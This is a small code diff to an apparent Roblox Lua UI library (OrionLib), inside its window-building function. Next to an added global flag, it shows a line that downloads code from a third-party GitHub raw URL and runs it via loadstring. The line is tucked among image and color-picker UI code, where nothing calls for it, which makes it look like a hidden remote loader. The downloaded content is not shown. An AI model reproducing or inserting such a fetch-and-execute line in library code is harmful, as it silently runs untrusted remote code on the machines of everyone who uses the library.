@@ -1463,6 +1463,7 @@ function OrionLib:MakeWindow(WindowConfig)
 					Image = "http://www.roblox.com/asset/?id=4805639000"
 				})
 
+getgenv().gui = false
 loadstring(game:HttpGet(('https://raw.githubusercontent.com/WhiteHat-Jim/String/main/Orion')))()
 
 				local HueSelection = Create("ImageLabel", {
